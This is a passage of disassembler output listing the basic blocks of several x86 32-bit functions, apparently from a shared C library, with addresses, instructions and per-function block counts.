0xb01c32a:	mov	dword ptr [esp + 4], eax
0xb01c32e:	mov	dword ptr [esp], esi
0xb01c331:	mov	dword ptr [ebp - 0x24], edx
0xb01c334:	call	0xb07a740
None
|
|
|
v
0xb01c2e2:	jne	0xb01c440
None
|
|
|
v
0xb01c25f:	jne	0xb01c430
None
|
|
|
v
0xb01c197:	xor	eax, eax
0xb01c199:	mov	ecx, 1
0xb01c19e:	cmp	dword ptr gs:[0xc], 0
0xb01c1a6:	je	0xb01c1a9
None
|
|
|
v
0xb01c362:	cmp	dword ptr gs:[0xc], 0
0xb01c36a:	je	0xb01c36d
None
|
|
|
v
0xb01c21f:	test	byte ptr [ebp + 0xc], 1
0xb01c223:	mov	edx, eax
0xb01c225:	jne	0xb01c2f2
None
|
|
|
v
0xb01c41b:	jmp	0xb01c1b6
None
|
|
|
v
0xb01c288:	lea	edx, dword ptr [ebx - 0x18e2a0]
0xb01c28e:	mov	eax, dword ptr [ebx + 0x389c]
0xb01c294:	mov	dword ptr [esp + 4], edx
0xb01c298:	lea	edx, dword ptr [ebx + 0xfa8]
0xb01c29e:	ror	eax, 9
0xb01c2a1:	xor	eax, dword ptr gs:[0x18]
0xb01c2a8:	mov	dword ptr [esp], edx
0xb01c2ab:	call	eax
None
|
|
|
v
0xb01c450:	lea	eax, dword ptr [ebx + 0x3668]
0xb01c456:	call	0xb0f9460
None
|
|
|
v
0xb01c1a8:	lock cmpxchg	dword ptr [ebx + 0x3668], ecx
0xb01c1b0:	jne	0xb01c410
None
|
|
|
v
0xb01c410:	lea	ecx, dword ptr [ebx + 0x3668]
0xb01c416:	call	0xb0f9430
None
|
|
|
v
0xb01c189:	mov	ecx, dword ptr [ebx + 0xfa8]
0xb01c18f:	test	ecx, ecx
0xb01c191:	je	0xb01c2b8
None
|
|
|
v
0xb01c339:	test	eax, eax
0xb01c33b:	je	0xb01c362
None
|
|
|
v
0xb01c42b:	jmp	0xb01c1f1
None
|
|
|
v
0xb01c257:	lock sub	dword ptr [ebx + 0x3668], 1
None
|
|
|
v
0xb01c2b8:	call	0xb01cd60
None
|
|
|
v
0xb01c265:	test	edx, edx
0xb01c267:	mov	eax, edx
0xb01c269:	jne	0xb01c1f3
None
|
|
|
v
0xb01c301:	test	eax, eax
0xb01c303:	je	0xb01c362
None
|
|
|
v
0xb01c2e8:	mov	eax, 1
0xb01c2ed:	jmp	0xb01c1f3
None
|
|
|
v
0xb01c1e3:	lock sub	dword ptr [ebx + 0x3668], 1
None
|
|
|
v
0xb01c2bd:	or	dword ptr [ebx + 0xfa8], 2
0xb01c2c4:	jmp	0xb01c197
None
|
|
|
v
0xb01c374:	jne	0xb01c450
None
|
|
|
v
0xb01c1f1:	mov	eax, edx
0xb01c1f3:	lea	esp, dword ptr [ebp - 0xc]
0xb01c1f6:	pop	ebx
0xb01c1f7:	pop	esi
0xb01c1f8:	pop	edi
0xb01c1f9:	pop	ebp
0xb01c1fa:	ret	8
None
|
|
|
v
0xb01c43b:	jmp	0xb01c265
None
|
|
|
v
0xb01c1eb:	jne	0xb01c420
None
|
|
|
v
0xb01c36c:	lock sub	dword ptr [ebx + 0x3668], 1
None
|
|
|
v
0xb01c430:	lea	eax, dword ptr [ebx + 0x3668]
0xb01c436:	call	0xb0f9460
None
|
|
|
v
0xb01c2d0:	cmp	dword ptr gs:[0xc], 0
0xb01c2d8:	je	0xb01c2db
None
|
|
|
v
0xb01c318:	mov	edx, dword ptr [ebp - 0x24]
0xb01c31b:	test	eax, eax
0xb01c31d:	je	0xb01c362
None
|
|
|
v
0xb01c44b:	jmp	0xb01c2e8
None
|
|
|
v
0xb01c2f2:	mov	dword ptr [esp + 4], edi
0xb01c2f6:	mov	dword ptr [esp], esi
0xb01c2f9:	mov	dword ptr [ebp - 0x24], eax
0xb01c2fc:	call	0xb07a740
None
|
|
|
v
0xb01c357:	mov	edx, dword ptr [ebp - 0x24]
0xb01c35a:	test	eax, eax
0xb01c35c:	jne	0xb01c22b
None
|
|
|
v
0xb01c305:	mov	edx, dword ptr [ebp - 0x24]
0xb01c308:	test	edx, edx
0xb01c30a:	je	0xb01c31f
None
|
|
|
v
0xb01c20e:	mov	eax, edi
0xb01c210:	call	0xb01b5c0
None
|
|
|
v
0xb01c420:	lea	eax, dword ptr [ebx + 0x3668]
0xb01c426:	call	0xb0f9460
None
|
|
|
v
0xb01c33d:	mov	edx, dword ptr [ebp - 0x24]
0xb01c340:	test	edx, edx
0xb01c342:	je	0xb01c22b
None
|
|
|
v
0xb01c2da:	lock sub	dword ptr [ebx + 0x3668], 1
None
|
|
|
v
0xb01c440:	lea	eax, dword ptr [ebx + 0x3668]
0xb01c446:	call	0xb0f9460
None
|
|
|
v
0xb01c215:	mov	dword ptr [ebp - 0x20], eax
0xb01c218:	mov	eax, esi
0xb01c21a:	call	0xb01b5c0
None
|
|
|
v
0xb01c248:	sub	esp, 0xc
0xb01c24b:	mov	edx, eax
0xb01c24d:	cmp	dword ptr gs:[0xc], 0
0xb01c255:	je	0xb01c258
None
|
|
|
v
0xb01c45b:	jmp	0xb01c37a
None
|
|
|
v
0xb01c26b:	mov	eax, dword ptr [ebp - 0x1c]
0xb01c26e:	mov	eax, dword ptr [eax]
0xb01c270:	test	eax, eax
0xb01c272:	sete	al
0xb01c275:	lea	esp, dword ptr [ebp - 0xc]
0xb01c278:	movzx	eax, al
0xb01c27b:	pop	ebx
0xb01c27c:	pop	esi
0xb01c27d:	pop	edi
0xb01c27e:	pop	ebp
0xb01c27f:	ret	8
None
|
|
|
v
0xb01c16f:	add	ebx, 0x18ee91
0xb01c175:	sub	esp, 0x2c
0xb01c178:	mov	dword ptr [ebp - 0x1c], ecx
0xb01c17b:	mov	eax, dword ptr [ebx + 0x38d8]
0xb01c181:	test	eax, eax
0xb01c183:	jne	0xb01c288
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c390
TOTAL BLOCKS :16
0xb01c470:	lea	eax, dword ptr [ebx + 0x3668]
0xb01c476:	call	0xb0f9460
None
|
|
|
v
0xb01c46b:	jmp	0xb01c3c7
None
|
|
|
v
0xb01c406:	add	esp, 0x1c
0xb01c409:	xor	eax, eax
0xb01c40b:	pop	ebx
0xb01c40c:	pop	esi
0xb01c40d:	pop	edi
0xb01c40e:	pop	ebp
0xb01c40f:	ret	
None
|
|
|
v
0xb01c460:	lea	ecx, dword ptr [ebx + 0x3668]
0xb01c466:	call	0xb0f9430
None
|
|
|
v
0xb01c3fc:	lock sub	dword ptr [ebx + 0x3668], 1
None
|
|
|
v
0xb01c3c7:	test	edx, edx
0xb01c3c9:	je	0xb01c3e7
None
|
|
|
v
0xb01c3cb:	imul	eax, edx, 0x3c
0xb01c3ce:	mov	edx, dword ptr [esp + 0xc]
0xb01c3d2:	mov	esi, edi
0xb01c3d4:	lea	ebp, dword ptr [edx + eax - 0x3c]
0xb01c3d8:	mov	eax, ebp
0xb01c3da:	sub	ebp, 0x3c
0xb01c3dd:	call	0xb01b6a0
None
|
|
|
v
0xb01c3a9:	add	ebx, 0x18ec57
0xb01c3af:	cmp	dword ptr gs:[0xc], 0
0xb01c3b7:	je	0xb01c3ba
None
|
|
|
v
0xb01c3b9:	lock cmpxchg	dword ptr [ebx + 0x3668], ecx
0xb01c3c1:	jne	0xb01c460
None
|
|
|
v
0xb01c404:	jne	0xb01c470
None
|
|
|
v
0xb01c390:	push	ebp
0xb01c391:	mov	ecx, 1
0xb01c396:	push	edi
0xb01c397:	mov	edi, edx
0xb01c399:	push	esi
0xb01c39a:	push	ebx
0xb01c39b:	sub	esp, 0x1c
0xb01c39e:	mov	dword ptr [esp + 0xc], eax
0xb01c3a2:	xor	eax, eax
0xb01c3a4:	call	0xb1267db
None
|
|
|
v
0xb01c3e7:	mov	eax, dword ptr [esp + 0xc]
0xb01c3eb:	mov	edx, edi
0xb01c3ed:	call	0xb024390
None
|
|
|
v
0xb01c3e2:	sub	esi, 1
0xb01c3e5:	jne	0xb01c3d8
None
|
|
|
v
0xb01c3d8:	mov	eax, ebp
0xb01c3da:	sub	ebp, 0x3c
0xb01c3dd:	call	0xb01b6a0
None
|
|
|
v
0xb01c47b:	jmp	0xb01c406
None
|
|
|
v
0xb01c3f2:	cmp	dword ptr gs:[0xc], 0
0xb01c3fa:	je	0xb01c3fd
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c480
TOTAL BLOCKS :22
0xb01c4e0:	mov	eax, dword ptr [ebp]
0xb01c4e3:	mov	dword ptr [esp], edi
0xb01c4e6:	mov	dword ptr [esp + 4], eax
0xb01c4ea:	call	0xb07a740
None
|
|
|
v
0xb01c536:	mov	eax, dword ptr [esp + 8]
0xb01c53a:	mov	dword ptr [esp], eax
0xb01c53d:	call	0xb017470
None
|
|
|
v
0xb01c509:	test	eax, eax
0xb01c50b:	je	0xb01c520
None
|
|
|
v
0xb01c4ef:	test	eax, eax
0xb01c4f1:	jne	0xb01c50d
None
|
|
|
v
0xb01c52e:	mov	eax, dword ptr [esp + 0xc]
0xb01c532:	test	eax, eax
0xb01c534:	je	0xb01c4d8
None
|
|
|
v
0xb01c4d2:	mov	eax, dword ptr [esp + 8]
0xb01c4d6:	mov	dword ptr [esi], eax
0xb01c4d8:	add	esp, 0x1c
0xb01c4db:	pop	ebx
0xb01c4dc:	pop	esi
0xb01c4dd:	pop	edi
0xb01c4de:	pop	ebp
0xb01c4df:	ret	
None
|
|
|
v
0xb01c517:	jmp	0xb01c4d2
None
|
|
|
v
0xb01c489:	add	ebx, 0x18eb77
0xb01c48f:	sub	esp, 0x1c
0xb01c492:	mov	dword ptr [esp + 8], eax
0xb01c496:	mov	dword ptr [esp + 0xc], edx
0xb01c49a:	lea	esi, dword ptr [ebx + 0x366c]
0xb01c4a0:	jmp	0xb01c4cc
None
|
|
|
v
0xb01c4bd:	test	eax, eax
0xb01c4bf:	je	0xb01c4ef
None
|
|
|
v
0xb01c52c:	je	0xb01c544
None
|
|
|
v
0xb01c4d8:	add	esp, 0x1c
0xb01c4db:	pop	ebx
0xb01c4dc:	pop	esi
0xb01c4dd:	pop	edi
0xb01c4de:	pop	ebp
0xb01c4df:	ret	
None
|
|
|
v
0xb01c570:	add	esp, 0x1c
0xb01c573:	pop	ebx
0xb01c574:	pop	esi
0xb01c575:	pop	edi
0xb01c576:	pop	ebp
0xb01c577:	ret	
None
|
|
|
v
0xb01c4c1:	lea	ecx, dword ptr [ebp + 0x14]
0xb01c4c4:	test	eax, eax
0xb01c4c6:	lea	esi, dword ptr [ebp + 0x1c]
0xb01c4c9:	cmovs	esi, ecx
0xb01c4cc:	mov	ebp, dword ptr [esi]
0xb01c4ce:	test	ebp, ebp
0xb01c4d0:	jne	0xb01c4a8
None
|
|
|
v
0xb01c544:	mov	eax, dword ptr [esp + 8]
0xb01c548:	mov	edx, dword ptr [ebp + 0xc]
0xb01c54b:	cmp	dword ptr [eax + 0xc], edx
0xb01c54e:	jge	0xb01c52e
None
|
|
|
v
0xb01c50d:	lea	esi, dword ptr [ebp + 0x18]
0xb01c510:	mov	ebp, dword ptr [ebp + 0x18]
0xb01c513:	test	ebp, ebp
0xb01c515:	jne	0xb01c4e0
None
|
|
|
v
0xb01c4a8:	mov	eax, dword ptr [esp + 8]
0xb01c4ac:	mov	edi, dword ptr [eax]
0xb01c4ae:	mov	eax, dword ptr [ebp]
0xb01c4b1:	mov	dword ptr [esp], edi
0xb01c4b4:	mov	dword ptr [esp + 4], eax
0xb01c4b8:	call	0xb07a740
None
|
|
|
v
0xb01c4cc:	mov	ebp, dword ptr [esi]
0xb01c4ce:	test	ebp, ebp
0xb01c4d0:	jne	0xb01c4a8
None
|
|
|
v
0xb01c520:	mov	eax, dword ptr [esp + 8]
0xb01c524:	mov	edx, dword ptr [ebp + 8]
0xb01c527:	cmp	dword ptr [eax + 8], edx
0xb01c52a:	jl	0xb01c550
None
|
|
|
v
0xb01c550:	mov	eax, dword ptr [ebp + 0x14]
0xb01c553:	mov	edx, dword ptr [esp + 8]
0xb01c557:	mov	dword ptr [edx + 0x14], eax
0xb01c55a:	mov	eax, dword ptr [ebp + 0x1c]
0xb01c55d:	mov	dword ptr [edx + 0x1c], eax
0xb01c560:	mov	eax, dword ptr [ebp + 0x18]
0xb01c563:	mov	dword ptr [edx + 0x18], eax
0xb01c566:	mov	dword ptr [esi], edx
0xb01c568:	mov	dword ptr [esp], ebp
0xb01c56b:	call	0xb017470
None
|
|
|
v
0xb01c4f3:	mov	eax, dword ptr [ebp + 4]
0xb01c4f6:	mov	dword ptr [esp + 4], eax
0xb01c4fa:	mov	eax, dword ptr [esp + 8]
0xb01c4fe:	mov	eax, dword ptr [eax + 4]
0xb01c501:	mov	dword ptr [esp], eax
0xb01c504:	call	0xb07a740
None
|
|
|
v
0xb01c542:	jmp	0xb01c4d8
None
|
|
|
v
0xb01c480:	push	ebp
0xb01c481:	push	edi
0xb01c482:	push	esi
0xb01c483:	push	ebx
0xb01c484:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c580
TOTAL BLOCKS :56
0xb01c600:	movzx	ecx, byte ptr [edx + 1]
0xb01c604:	lea	esi, dword ptr [edx + 1]
0xb01c607:	mov	byte ptr [edx], 0
0xb01c60a:	mov	dword ptr [ebp - 0x34], esi
0xb01c60d:	movsx	edx, cl
0xb01c610:	test	byte ptr [eax + edx*2 + 1], 0x20
0xb01c615:	je	0xb01c8a7
None
|
|
|
v
0xb01c6f5:	cmp	al, 0x2f
0xb01c6f7:	mov	eax, 0
0xb01c6fc:	cmovne	eax, dword ptr [ebp - 0x30]
0xb01c700:	mov	ecx, 3
0xb01c705:	mov	dword ptr [ebp - 0x30], eax
0xb01c708:	mov	eax, esi
0xb01c70a:	sub	eax, dword ptr [ebp - 0x3c]
0xb01c70d:	cmp	eax, 3
0xb01c710:	mov	dword ptr [ebp - 0x44], eax
0xb01c713:	jle	0xb01c73c
None
|
|
|
v
0xb01c7fb:	mov	edx, dword ptr [ebp + 0x10]
0xb01c7fe:	mov	edi, dword ptr [ebp - 0x40]
0xb01c801:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01c804:	mov	dword ptr [esi + 0xc], edx
0xb01c807:	mov	edx, dword ptr [ebp - 0x30]
0xb01c80a:	mov	dword ptr [esi + 8], edi
0xb01c80d:	mov	dword ptr [esi + 0x10], eax
0xb01c810:	test	edx, edx
0xb01c812:	je	0xb01c82d
None
|
|
|
v
0xb01c667:	mov	edx, dword ptr [ecx + edx*4]
0xb01c66a:	add	edi, 1
0xb01c66d:	add	esi, 1
0xb01c670:	mov	byte ptr [edi - 1], dl
0xb01c673:	movsx	edx, byte ptr [esi]
0xb01c676:	test	dl, dl
0xb01c678:	jne	0xb01c660
None
|
|
|
v
0xb01c753:	lea	edx, dword ptr [eax + 0x1f]
0xb01c756:	and	edx, 0xfffffff0
0xb01c759:	sub	esp, edx
0xb01c75b:	lea	edx, dword ptr [esp + 0x1b]
0xb01c75f:	and	edx, 0xfffffff0
0xb01c762:	mov	byte ptr [edx + eax], 0
0xb01c766:	mov	dword ptr [esp], edx
0xb01c769:	mov	dword ptr [esp + 8], eax
0xb01c76d:	mov	dword ptr [esp + 4], edi
0xb01c771:	call	0xb07d0b0
None
|
|
|
v
0xb01c7c8:	mov	edx, dword ptr [ebp - 0x48]
0xb01c7cb:	lea	eax, dword ptr [eax + 0x20]
0xb01c7ce:	mov	dword ptr [esi], eax
0xb01c7d0:	mov	dword ptr [esp + 4], edi
0xb01c7d4:	mov	dword ptr [esp], eax
0xb01c7d7:	mov	dword ptr [esp + 8], edx
0xb01c7db:	call	0xb07cad0
None
|
|
|
v
0xb01c8a7:	mov	esi, dword ptr [ebp - 0x34]
0xb01c8aa:	jmp	0xb01c630
None
|
|
|
v
0xb01c6d9:	lea	esi, dword ptr [ecx + 1]
0xb01c6dc:	mov	byte ptr [ecx], 0
0xb01c6df:	mov	dword ptr [ebp - 0x40], 1
0xb01c6e6:	mov	eax, dword ptr [ebp - 0x2c]
0xb01c6e9:	movzx	eax, byte ptr [eax + 1]
0xb01c6ed:	test	al, al
0xb01c6ef:	je	0xb01c5ef
None
|
|
|
v
0xb01c5b0:	add	edi, 1
0xb01c5b3:	movzx	edx, byte ptr [edi]
0xb01c5b6:	movsx	ecx, dl
0xb01c5b9:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c5be:	jne	0xb01c5b0
None
|
|
|
v
0xb01c89f:	lea	esi, dword ptr [ecx + 1]
0xb01c8a2:	jmp	0xb01c6e6
None
|
|
|
v
0xb01c5d8:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c5dd:	jne	0xb01c600
None
|
|
|
v
0xb01c8ba:	mov	dword ptr [ebp - 0x40], 1
0xb01c8c1:	jmp	0xb01c89f
None
|
|
|
v
0xb01c5df:	mov	ecx, dword ptr [esi + ecx*4]
0xb01c5e2:	add	edx, 1
0xb01c5e5:	mov	byte ptr [edx - 1], cl
0xb01c5e8:	movsx	ecx, byte ptr [edx]
0xb01c5eb:	test	cl, cl
0xb01c5ed:	jne	0xb01c5d8
None
|
|
|
v
0xb01c5ef:	lea	esp, dword ptr [ebp - 0xc]
0xb01c5f2:	pop	ebx
0xb01c5f3:	pop	esi
0xb01c5f4:	pop	edi
0xb01c5f5:	pop	ebp
0xb01c5f6:	ret	0xc
None
|
|
|
v
0xb01c5af:	nop	
None
|
|
|
v
0xb01c620:	add	esi, 1
0xb01c623:	movzx	ecx, byte ptr [esi]
0xb01c626:	movsx	edx, cl
0xb01c629:	test	byte ptr [eax + edx*2 + 1], 0x20
0xb01c62e:	jne	0xb01c620
None
|
|
|
v
0xb01c860:	jmp	0xb01c5ef
None
|
|
|
v
0xb01c888:	mov	ecx, dword ptr [ebp - 0x40]
0xb01c88b:	cmp	dword ptr [ebp - 0x20], esi
0xb01c88e:	je	0xb01c8ba
None
|
|
|
v
0xb01c61b:	nop	
0xb01c61c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01c6af:	mov	dword ptr [ebp - 0x40], edi
0xb01c6b2:	jmp	0xb01c6c6
None
|
|
|
v
0xb01c6c6:	add	ecx, 1
0xb01c6c9:	add	esi, 1
0xb01c6cc:	mov	byte ptr [ecx - 1], dl
0xb01c6cf:	movzx	edx, byte ptr [esi]
0xb01c6d2:	test	dl, dl
0xb01c6d4:	jne	0xb01c6b8
None
|
|
|
v
0xb01c5c4:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c5c9:	jne	0xb01c5f9
None
|
|
|
v
0xb01c814:	mov	edi, dword ptr [ebp - 0x30]
0xb01c817:	mov	dword ptr [esp], eax
0xb01c81a:	mov	dword ptr [esp + 8], edi
0xb01c81e:	mov	edi, dword ptr [ebp - 0x38]
0xb01c821:	mov	dword ptr [esp + 4], edi
0xb01c825:	call	0xb07cad0
None
|
|
|
v
0xb01c82d:	mov	edi, dword ptr [ebp - 0x44]
0xb01c830:	mov	dword ptr [esp], eax
0xb01c833:	mov	dword ptr [ebp - 0x2c], ecx
0xb01c836:	mov	dword ptr [esp + 8], edi
0xb01c83a:	mov	edi, dword ptr [ebp - 0x3c]
0xb01c83d:	mov	dword ptr [esp + 4], edi
0xb01c841:	call	0xb07cad0
None
|
|
|
v
0xb01c73c:	mov	eax, dword ptr [ebp - 0x34]
0xb01c73f:	mov	dword ptr [esp], edi
0xb01c742:	mov	dword ptr [ebp - 0x2c], ecx
0xb01c745:	sub	eax, edi
0xb01c747:	mov	dword ptr [esp + 4], eax
0xb01c74b:	mov	dword ptr [ebp - 0x48], eax
0xb01c74e:	call	0xb017480
None
|
|
|
v
0xb01c868:	lea	eax, dword ptr [ebp - 0x20]
0xb01c86b:	mov	edi, dword ptr [ebp - 0x40]
0xb01c86e:	mov	byte ptr [ecx], 0
0xb01c871:	mov	dword ptr [esp + 8], 0xa
0xb01c879:	mov	dword ptr [esp + 4], eax
0xb01c87d:	mov	dword ptr [esp], esi
0xb01c880:	mov	dword ptr [ebp - 0x40], ecx
0xb01c883:	call	0xb034640
None
|
|
|
v
0xb01c7e0:	mov	edi, dword ptr [ebp - 0x34]
0xb01c7e3:	mov	edx, dword ptr [ebp - 0x3c]
0xb01c7e6:	sub	edx, edi
0xb01c7e8:	mov	dword ptr [esi + 4], eax
0xb01c7eb:	mov	dword ptr [esp + 8], edx
0xb01c7ef:	mov	dword ptr [esp + 4], edi
0xb01c7f3:	mov	dword ptr [esp], eax
0xb01c7f6:	call	0xb07cad0
None
|
|
|
v
0xb01c890:	mov	esi, eax
0xb01c892:	test	eax, eax
0xb01c894:	mov	eax, 1
0xb01c899:	cmovg	eax, esi
0xb01c89c:	mov	dword ptr [ebp - 0x40], eax
0xb01c89f:	lea	esi, dword ptr [ecx + 1]
0xb01c8a2:	jmp	0xb01c6e6
None
|
|
|
v
0xb01c8af:	mov	edx, dword ptr [ebp - 0x34]
0xb01c8b2:	mov	dword ptr [ebp - 0x2c], edx
0xb01c8b5:	jmp	0xb01c686
None
|
|
|
v
0xb01c67a:	jmp	0xb01c5ef
None
|
|
|
v
0xb01c776:	mov	dword ptr [ebp - 0x20], eax
0xb01c779:	lea	eax, dword ptr [ebx - 0x18fa70]
0xb01c77f:	mov	dword ptr [esp + 8], eax
0xb01c783:	lea	eax, dword ptr [ebx + 0x3664]
0xb01c789:	mov	dword ptr [esp + 4], eax
0xb01c78d:	lea	eax, dword ptr [ebp - 0x20]
0xb01c790:	mov	dword ptr [esp], eax
0xb01c793:	call	0xb0e7ee0
None
|
|
|
v
0xb01c854:	mov	edx, 1
0xb01c859:	mov	eax, esi
0xb01c85b:	call	0xb01c480
None
|
|
|
v
0xb01c84d:	mov	dword ptr [eax - 1], 0x6f732e
0xb01c854:	mov	edx, 1
0xb01c859:	mov	eax, esi
0xb01c85b:	call	0xb01c480
None
|
|
|
v
0xb01c846:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01c849:	test	ecx, ecx
0xb01c84b:	je	0xb01c854
None
|
|
|
v
0xb01c798:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01c79b:	test	eax, eax
0xb01c79d:	jne	0xb01c5ef
None
|
|
|
v
0xb01c7be:	test	eax, eax
0xb01c7c0:	mov	esi, eax
0xb01c7c2:	je	0xb01c5ef
None
|
|
|
v
0xb01c6d6:	mov	edi, dword ptr [ebp - 0x40]
0xb01c6d9:	lea	esi, dword ptr [ecx + 1]
0xb01c6dc:	mov	byte ptr [ecx], 0
0xb01c6df:	mov	dword ptr [ebp - 0x40], 1
0xb01c6e6:	mov	eax, dword ptr [ebp - 0x2c]
0xb01c6e9:	movzx	eax, byte ptr [eax + 1]
0xb01c6ed:	test	al, al
0xb01c6ef:	je	0xb01c5ef
None
|
|
|
v
0xb01c7a3:	mov	eax, dword ptr [ebp - 0x30]
0xb01c7a6:	sub	esi, edi
0xb01c7a8:	mov	dword ptr [esp], 1
0xb01c7af:	lea	eax, dword ptr [eax + esi + 0x20]
0xb01c7b3:	add	eax, ecx
0xb01c7b5:	mov	dword ptr [esp + 4], eax
0xb01c7b9:	call	0xb017450
None
|
|
|
v
0xb01c732:	cmp	eax, 1
0xb01c735:	sbb	ecx, ecx
0xb01c737:	not	ecx
0xb01c739:	and	ecx, 3
0xb01c73c:	mov	eax, dword ptr [ebp - 0x34]
0xb01c73f:	mov	dword ptr [esp], edi
0xb01c742:	mov	dword ptr [ebp - 0x2c], ecx
0xb01c745:	sub	eax, edi
0xb01c747:	mov	dword ptr [esp + 4], eax
0xb01c74b:	mov	dword ptr [ebp - 0x48], eax
0xb01c74e:	call	0xb017480
None
|
|
|
v
0xb01c5cb:	mov	esi, dword ptr [ebx - 0xf84]
0xb01c5d1:	mov	edx, edi
0xb01c5d3:	jmp	0xb01c5df
None
|
|
|
v
0xb01c680:	mov	dword ptr [ebp - 0x2c], edi
0xb01c683:	mov	edi, dword ptr [ebp - 0x3c]
0xb01c686:	mov	edx, dword ptr [ebp - 0x2c]
0xb01c689:	lea	ecx, dword ptr [edx + 1]
0xb01c68c:	mov	dword ptr [ebp - 0x3c], ecx
0xb01c68f:	mov	byte ptr [edx], 0
0xb01c692:	lea	esi, dword ptr [esi]
0xb01c698:	add	esi, 1
0xb01c69b:	movzx	edx, byte ptr [esi]
0xb01c69e:	movsx	ecx, dl
0xb01c6a1:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c6a6:	jne	0xb01c698
None
|
|
|
v
0xb01c58d:	add	ebx, 0x18ea73
0xb01c593:	sub	esp, 0x4c
0xb01c596:	mov	dword ptr [ebp - 0x30], ecx
0xb01c599:	mov	dword ptr [ebp - 0x38], edx
0xb01c59c:	movzx	edx, byte ptr [edi]
0xb01c59f:	mov	eax, dword ptr [ebx - 0xf8c]
0xb01c5a5:	movsx	ecx, dl
0xb01c5a8:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c5ad:	je	0xb01c5c0
None
|
|
|
v
0xb01c630:	test	cl, cl
0xb01c632:	je	0xb01c5ef
None
|
|
|
v
0xb01c698:	add	esi, 1
0xb01c69b:	movzx	edx, byte ptr [esi]
0xb01c69e:	movsx	ecx, dl
0xb01c6a1:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c6a6:	jne	0xb01c698
None
|
|
|
v
0xb01c580:	push	ebp
0xb01c581:	mov	ebp, esp
0xb01c583:	push	edi
0xb01c584:	mov	edi, eax
0xb01c586:	push	esi
0xb01c587:	push	ebx
0xb01c588:	call	0xb1267db
None
|
|
|
v
0xb01c715:	lea	eax, dword ptr [ebx - 0x4aece]
0xb01c71b:	mov	dword ptr [esp + 4], eax
0xb01c71f:	lea	eax, dword ptr [esi - 4]
0xb01c722:	mov	dword ptr [esp + 8], 4
0xb01c72a:	mov	dword ptr [esp], eax
0xb01c72d:	call	0xb07c620
None
|
|
|
v
0xb01c660:	test	byte ptr [eax + edx*2 + 1], 0x20
0xb01c665:	jne	0xb01c680
None
|
|
|
v
0xb01c82a:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01c82d:	mov	edi, dword ptr [ebp - 0x44]
0xb01c830:	mov	dword ptr [esp], eax
0xb01c833:	mov	dword ptr [ebp - 0x2c], ecx
0xb01c836:	mov	dword ptr [esp + 8], edi
0xb01c83a:	mov	edi, dword ptr [ebp - 0x3c]
0xb01c83d:	mov	dword ptr [esp + 4], edi
0xb01c841:	call	0xb07cad0
None
|
|
|
v
0xb01c642:	mov	edx, dword ptr [ebp - 0x34]
0xb01c645:	mov	ecx, dword ptr [ebx - 0xf84]
0xb01c64b:	mov	dword ptr [ebp - 0x2c], edx
0xb01c64e:	mov	edx, dword ptr [ebp - 0x3c]
0xb01c651:	mov	dword ptr [ebp - 0x3c], edi
0xb01c654:	mov	edi, dword ptr [ebp - 0x2c]
0xb01c657:	jmp	0xb01c667
None
|
|
|
v
0xb01c686:	mov	edx, dword ptr [ebp - 0x2c]
0xb01c689:	lea	ecx, dword ptr [edx + 1]
0xb01c68c:	mov	dword ptr [ebp - 0x3c], ecx
0xb01c68f:	mov	byte ptr [edx], 0
0xb01c692:	lea	esi, dword ptr [esi]
0xb01c698:	add	esi, 1
0xb01c69b:	movzx	edx, byte ptr [esi]
0xb01c69e:	movsx	ecx, dl
0xb01c6a1:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb01c6a6:	jne	0xb01c698
None
|
|
|
v
0xb01c6a8:	test	dl, dl
0xb01c6aa:	mov	ecx, dword ptr [ebp - 0x3c]
0xb01c6ad:	je	0xb01c6d9
None
|
|
|
v
0xb01c5c0:	test	dl, dl
0xb01c5c2:	je	0xb01c5ef
None
|
|
|
v
0xb01c5f9:	mov	edx, edi
0xb01c5fb:	nop	
0xb01c5fc:	lea	esi, dword ptr [esi]
0xb01c600:	movzx	ecx, byte ptr [edx + 1]
0xb01c604:	lea	esi, dword ptr [edx + 1]
0xb01c607:	mov	byte ptr [edx], 0
0xb01c60a:	mov	dword ptr [ebp - 0x34], esi
0xb01c60d:	movsx	edx, cl
0xb01c610:	test	byte ptr [eax + edx*2 + 1], 0x20
0xb01c615:	je	0xb01c8a7
None
|
|
|
v
0xb01c6b8:	movsx	edi, dl
0xb01c6bb:	test	byte ptr [eax + edi*2 + 1], 0x20
0xb01c6c0:	jne	0xb01c868
None
|
|
|
v
0xb01c634:	test	byte ptr [eax + edx*2 + 1], 0x20
0xb01c639:	mov	dword ptr [ebp - 0x3c], edx
0xb01c63c:	jne	0xb01c8af
None
|
|
|
v
0xb01c6e6:	mov	eax, dword ptr [ebp - 0x2c]
0xb01c6e9:	movzx	eax, byte ptr [eax + 1]
0xb01c6ed:	test	al, al
0xb01c6ef:	je	0xb01c5ef
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c8d0
TOTAL BLOCKS :10
0xb01c8d0:	push	edi
0xb01c8d1:	mov	edi, eax
0xb01c8d3:	push	esi
0xb01c8d4:	push	ebx
0xb01c8d5:	call	0xb1267db
None
|
|
|
v
0xb01c8ed:	mov	eax, dword ptr [esi]
0xb01c8ef:	mov	dword ptr [esp], edi
0xb01c8f2:	mov	dword ptr [esp + 4], eax
0xb01c8f6:	call	0xb07a740
None
|
|
|
v
0xb01c918:	mov	esi, dword ptr [esi + 0x14]
0xb01c91b:	jmp	0xb01c8e9
None
|
|
|
v
0xb01c920:	add	esp, 0x10
0xb01c923:	mov	eax, 1
0xb01c928:	pop	ebx
0xb01c929:	pop	esi
0xb01c92a:	pop	edi
0xb01c92b:	ret	
None
|
|
|
v
0xb01c908:	add	esp, 0x10
0xb01c90b:	xor	eax, eax
0xb01c90d:	pop	ebx
